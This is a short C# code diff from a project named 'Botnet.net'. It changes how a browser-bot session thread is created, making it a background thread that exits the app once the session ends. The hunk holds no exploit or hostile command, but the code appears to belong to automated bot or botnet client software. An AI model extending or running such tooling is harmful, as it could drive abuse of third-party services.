@@ -24,11 +24,12 @@ namespace Botnet.net
                 if (TaskManager.TryGetTask(out task))
                 {
                     BotBrowser bot = new BotBrowser(task);
-                    System.Threading.Tasks.Task closeApp = new System.Threading.Tasks.Task(() =>
+                    System.Threading.Thread closeApp = new System.Threading.Thread(() =>
                     {
                         bot.SleepToSession();
                         Application.Exit();
                     });
+                    closeApp.IsBackground = true;
                     closeApp.Start();
                     Application.Run(bot);
 
